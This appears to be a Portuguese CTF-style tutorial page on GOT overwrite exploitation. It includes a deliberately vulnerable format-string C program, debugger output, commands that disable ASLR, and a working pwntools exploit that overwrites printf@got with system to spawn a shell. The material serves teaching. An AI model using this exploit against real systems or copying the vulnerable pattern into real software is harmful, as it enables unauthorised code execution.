---
title: GOT Overwrite
sidebar_position: 4
---

A GOT (Global Offset Table) é uma tabela no binário ELF que contém endereços de funções de bibliotecas compartilhadas, entre elas a `libc`. Se pudermos sobrescrever uma entrada dessa tabela, podemos ganhar execução de código.

Como assim? Bom, imagine o seguinte código:

```c
char buffer[20];
gets(buffer);
printf(buffer);
```

Se conseguirmos sobrescrever a GOT, podemos fazer o endereço de `printf` na verdade ser o endereço de `system`! E, na visão do programa:

```c
char buffer[20];
gets(buffer);
system(buffer);
```

## Funcionamento da GOT

Temos a GOT, que possui o endereço da funções externas ao código. Ela precisa ser atualizada (resolvida), pois a `libc` pode estar sendo carregada em endereços diferentes a cada execução por causa do `ASLR`. A GOT armazena os endereços absolutos das funções já resolvidas.

Temos também a PLT (Procedure Linkage Table). Ela é intermediária entre o GOT e o programa. Sempre que você chama uma função da libc, você vai perceber que estará chamando `printf@plt` que aponta para `printf@got`. Isso é um **link**. 

Na **primeira chamada** de uma função, o dinamic linker resolve o endereço real e escreve o endereço real em `printf@got`, ou seja, na GOT. **Nas próximas chamadas**, o programa continua usando `printf@plt`, mas o GOT agora possui o endereço definitivo da função na `libc`.

Na primeira chamada:

```
Seu Programa
    │
    ▼ chama printf@plt   (1ª chamada)
    │
PLT (Procedure Linkage Table)
    │
    ▼ pula para endereço em *GOT* (mas na 1ª vez, 
    │   esse endereço aponta de volta para PLT+alguma coisa)
    │
GOT (Global Offset Table)  
    │ (na 1ª vez: aponta de volta para resolver)
    ▼
    │
    └─► Volta para PLT (que chama o linker dinâmico no kernel)
        │
        ▼ linker dinâmico resolve o endereço real
        │
        ▼ atualiza GOT com endereço REAL de printf na libc
```

Nas próximas chamadas:

```
Programa
    │
    ▼ chama printf@plt   
    │
PLT (Procedure Linkage Table)
    │ 
    ▼ pula para endereço em printf@got
    │
GOT (Global Offset Table)
    │ 
    ▼ contém endereço real de printf na libc 
    │
    └─► printf na libc (em memória)
```

Isso é importante, pois isso quer dizer que **podemos sobrescrever a GOT (temos permissão de escrita)**.

Para entender melhor o funciona

Se olharmos uma chamada de função da `libc` qualquer em um binário, veremos que esta chama `função@plt`, que aponta para `função@got`. Na primeira chamada, `função@got` estará apontando para `função@plt+X`, com X sendo um número. Esse "callback" é uma chamada dentro de `função@plt` para dentro do kernel, que faz a resolução do endereço da função.

Após a primeira chamada, `função@plt` aponta para `função@got` que aponta para `função@libc`. Veremos isso na prática.


## Sobrescrevendo GOT

Para fazer o GOT overwrite, precisamos de uma vulnerabilidade de **escrita arbitrária** na memória.

Exemplos de vulnerabilidades que podemos usar:

- Format String com %n (pode escrever em qualquer endereço, inclusive em `printf@got`)
- Heap Overflow que atinge ponteiro para GOT
- UAF que permite modificar ponteiro de função

### GOT Overwrite com Format String

O exemplo abaixo é o mais simples possível para GOT Overwrite.

```c
#include <stdio.h>

void vuln() {
    char buffer[300];
    
    while(1) {
        fgets(buffer, sizeof(buffer), stdin); // Impossível BOF

        printf(buffer); // Vulnerabilidade Format String
        puts("");
    }
}

int main() {
    vuln();

    return 0;
}
```

Vemos que não é possível fazer BOF, mas temos uma Format String e o `printf` é chamado infinitamente por causa de `while(1)`. Nosso objetivo será de transformar `printf` em `system`.

#### Analisando arquivo

Se analisarmos o arquivo antes de rodar tudo, veremos que todas as call de funções na libc apontam para a PLT.

```bash
pwndbg> disas vuln

...
0x080491af <+45>:    call   0x8049040 <fgets@plt>     <<<<<
0x080491b4 <+50>:    add    esp,0x10
0x080491b7 <+53>:    sub    esp,0xc
0x080491ba <+56>:    lea    eax,[ebp-0x134]
0x080491c0 <+62>:    push   eax
0x080491c1 <+63>:    call   0x8049030 <printf@plt>    <<<<<
0x080491c6 <+68>:    add    esp,0x10
0x080491c9 <+71>:    sub    esp,0xc
0x080491cc <+74>:    lea    eax,[ebx-0x1ff8]
0x080491d2 <+80>:    push   eax
0x080491d3 <+81>:    call   0x8049050 <puts@plt>      <<<<<
```

Se analisarmos o `fgets@plt`:

```bash
pwndbg> x 0x8049040
0x8049040 <fgets@plt>:  0xc01025ff

pwndbg> disas 0x8049040
Dump of assembler code for function fgets@plt:
   0x08049040 <+0>:     jmp    DWORD PTR ds:0x804c010
   0x08049046 <+6>:     push   0x8
   0x0804904b <+11>:    jmp    0x8049020
End of assembler dump.
```

Antes da primeira execução:

```
pwndbg> x 0x804c010
0x804c010 <fgets@got.plt>:      0x08049046

pwndbg> x 0x08049046
0x8049046 <fgets@plt+6>:        0x00000868

pwndbg> disas 0x8049046
Dump of assembler code for function fgets@plt:
   0x08049040 <+0>:     jmp    DWORD PTR ds:0x804c010
   0x08049046 <+6>:     push   0x8
   0x0804904b <+11>:    jmp    0x8049020
End of assembler dump.

pwndbg> x 0x8049020
0x8049020:      0xc00435ff

pwndbg> x 0xc00435ff
0xc00435ff:     Cannot access memory at address 0xc00435ff
```

A memória que não conseguimos acessar é o PLT chamando o linker dinâmico dentro do kernel.

Depois da primeira execução:

```
pwndbg> x 0x804c010
0x804c010 <fgets@got.plt>:      0xf7ddea80

pwndbg> x 0xf7ddea80
0xf7ddea80 <fgets>:     0x57e58955
```

Agora temos `fgets` na libc. Assim, vemos na prática toda a teoria sobre PLT e GOT. As funções sempre vão apontar para `função@plt`, e o PLT sempre vai conter o endereço da `função@got`. A única coisa que é sobrescrita é a GOT.

#### Encontrando offset do buffer

Primeiro, vamos encontrar o offset até o começo do buffer. Lembre-se que fazemos isso apenas colocando vários `%p` até ser impresso `0x..7025..` que é `%p` em hexadecimal. **Isso indica que chegamos no início do buffer**.

```
$./programa

%p %p %p %p %p %p
0x12c 0xf7f975c0 0x8049191 0x17 0x25207025 0x70252070
                                        ^
                                        |
                                 Aqui! (little endian)
```

Vemos que o 5° argumento é nosso início de buffer.

```
$./programa

%5$p     // 0x70243525 em hexadecimal
0x70243525
```

Agora temos certeza.

#### Encontrando endereço de printf@got

Se `PIE` estiver desligado no programa, podemos encontrar manualmente o endereço de `printf@got`. Podemos usar `objdump`:

```
$ objdump -R ./got_overwrite-32| grep printf      
0804c00c R_386_JUMP_SLOT   printf@GLIBC_2.0
^^^^^^^^
```

Ou podemos usar pwntools:

```py
>>> elf = context.binary = ELF('./got_overwrite-32')
>>> print(hex(elf.got['printf']))
0x804c00c
```

Assim, `printf@got = 0x0804c00c`.

#### Encontrando endereço de system@libc

Se a função `system` for declarada no programa, basta obter `system@plt`. Podemos achar isso com `objdump`

```
$ objdump -d -j .plt ./got_overwrite-32 | grep system
# Vazio
```

Porém, vemos que isso não ocorre no nosso caso, já que `system` nunca é chamada e portanto nunca estará no PLT. Isso complica um pouco as coisas, pois vamos ter que obter diretamente `system@libc`. Vamos ver como obter `system@libc` localmente, e depois como obter isso em CTFs.

##### Encontrando system@libc localmente

1. Qual o local da libc sendo usada?

```bash
ldd ./got_overwrite-32 
        linux-gate.so.1 (0xf7fc4000)
        libc.so.6 => /usr/lib32/libc.so.6 (0xf7d63000)
        /lib/ld-linux.so.2 (0xf7fc6000)
```

2. Qual o offset de `system` na libc?

```bash
$ objdump -T /usr/lib32/libc.so.6 | grep " system"
00053660  w   DF .text  00000037  GLIBC_2.0   system
^^^^^^^^
```

3. Qual o endereço base da libc?

```bash
# 3. Rodar programa e, em outro terminal, encontrar onde libc carrega (ASLR desligado)
$ cat /proc/$(pidof got_overwrite-32)/maps | grep libc
f7d63000-f7d87000 r--p 00000000 08:01 2801499                            /usr/lib32/libc.so.6
    ↑
  libc_base = 0xf7d63000

f7d87000-f7f10000 r-xp 00024000 08:01 2801499                            /usr/lib32/libc.so.6
f7f10000-f7f95000 r--p 001ad000 08:01 2801499                            /usr/lib32/libc.so.6
f7f95000-f7f97000 r--p 00232000 08:01 2801499                            /usr/lib32/libc.so.6
f7f97000-f7f98000 rw-p 00234000 08:01 2801499                            /usr/lib32/libc.so.6
...
```

Com ASLR desligado, a libc carrega no mesmo lugar sempre. Se quiser controlar o ASLR na sua máquina:

```bash
# Desligar ASLR até reiniciar sistema
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Verificar status
cat /proc/sys/kernel/randomize_va_space

# Reativar completamente (padrão)
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```

Assim, temos que `libc_base = 0xf7d63000` e offset do `system = 0x53660`. Com isso, o endereço de `system` é `0xf7d63000 + 0x53660 = 0xf7db6660` (soma da base + offset).

Com pwntools, precisamos apenas obter o endereço base da libc.

```py
elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc

# Endereço base da libc
libc.address = 0xf7d63000

# pwntools já possui os offsets internamente
print(hex(libc.sym['system']))
```

##### Encontrando system@libc em CTFs

Para CTFs, a questão se complica, pois não temos acesso ao computador onde o arquivo está. Assim, não podemos ver o endereço base da `libc` que nos permite achar `system@libc`. A solução é **vazar qualquer coisa dentro da libc e usar o offset deste item vazado para achar o endereço base da `libc`**.

Ter que vazar a libc costuma ser muito comum em CTFs.

#### Fazendo payload

O pwntools já possui um construtor de payload de `%n` para format strings nativo que facilita bastante o trabalho.

```py
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
# Endereço base da libc (ASLR desabilitado)
libc.address = 0xf7d63000

p = process()

# fmtstr_payload(n° argumento, {onde escrever : o que escrever})
payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

# Após 1 loop, voltamos ao printf novamente, que agora é system!
p.sendline('/bin/sh') # Na verdade: system("/bin/sh")

p.interactive()
```

#### Analisando o payload

O pwntools gera o payload automaticamente. Mas o que ele realmente está fazendo? O payload enviado foi:

```
%96c%16$hhn%6c%17$hhn%117c%18$hhn%28c%19$hhn\x0c\xc0\x04\x08\r\xc0\x04\x08\x0e\xc0\x04\x08\x0f\xc0\x04\x08
```

Vale lembrar os endereços que encontramos.

- `printf@got`  = `0x804c00c`
- `system@libc` = `0xf7db6660`

##### Parte 1: Format String

A format string enviada possui 44 caracteres = 44 bytes.

```
%96c%16$hhn%6c%17$hhn%117c%18$hhn%28c%19$hhn
```

Separando, conseguimos entender melhor.

```
%96c        → escreve 96 (0x60) caracteres
%16$hhn     → escreve o número total de bytes impressos até aqui no endereço apontado pelo 16º argumento

%6c         → adiciona 6 caracteres (total = 102 = 0x66)
%17$hhn     → escreve no endereço do 17º argumento

%117c       → adiciona 117 caracteres (total = 219 = 0xdb)
%18$hhn     → escreve no endereço do 18º argumento

%28c        → adiciona 28 caracteres (total = 247 = 0xf7)
%19$hhn     → escreve no endereço do 19º argumento
```

Lembre-se que **`%hhn` escreve apenas 1 byte (0x00 - 0xff) no endereço apontado** (veja [Format Strings - Tipos de Format Strings](/docs/pwning/format-strings#tipos-de-format-strings)). Assim, estamos escrevendo o endereço de `system@libc` em `printf@got` byte a byte!

Isso evita ter que usar números muito grandes e facilita o processo. Note também que usar `%n` exige que escrevamos os bytes em ordem crescente, já que somente podemos adicionar caracteres à contagem do `%n`, nunca retirar. Se o endereço a ser escrito não estivesse com os bytes em ordem crescente (como `0x000030d6`, `d6` é maior que `30` e `30` é maior que `00` e `00`), bastaria alterar a ordem dos parâmetros (o pwntools faz isso automaticamente).

##### Parte 2: Endereços

Cada `%hhn` está escrevendo apenas 1 byte. Assim, temos que selecionar o byte que queremos escrever de `printf@got` para cada `%hhn`.

```
\x0c\xc0\x04\x08  → 0x0804c00c (printf@got + 0) (16° Parâmetro)
\r\xc0\x04\x08    → 0x0804c00d (printf@got + 1) (17° Parâmetro)
\x0e\xc0\x04\x08  → 0x0804c00e (printf@got + 2) (18° Parâmetro)
\x0f\xc0\x04\x08  → 0x0804c00f (printf@got + 3) (19° Parâmetro)
```

Por que 16° parâmetro, se o início do buffer era o 5° parâmetro? Aí que está, colocamos várias format strings no início do buffer, então temos que pular elas.

Lembra que temos 44 caracteres = 44 bytes? Bom, 44 / 4 bytes (x86) nos dá 11 parâmetros. **Assim, a format string está ocupando 11 parâmetros**, já que a cada 4 bytes temos um parâmetro. Pulamos isso fazendo 5 + 11 = 16. Portanto, o 16° parâmetro é o primeiro endereço (printf@got + 0).

Em alguns payloads gerados pelo pwntools, você vai perceber que ele coloca `aaa` de padding ao final da format string. Isso ocorre pois ele está deixando a format string alinhada em 4 bytes, para o parâmetro do endereço ser capturado corretamente e não pela metade.

## Créditos

- [Ir0nstone](https://ir0nstone.gitbook.io/notes/binexp/stack/got-overwrite/exploiting-a-got-overwrite) - Binário e excelente explicação
- [Ian](https://ian.nl/blog/format-string-got-overwrite-attack) - Aprofundamento no payload do pwntools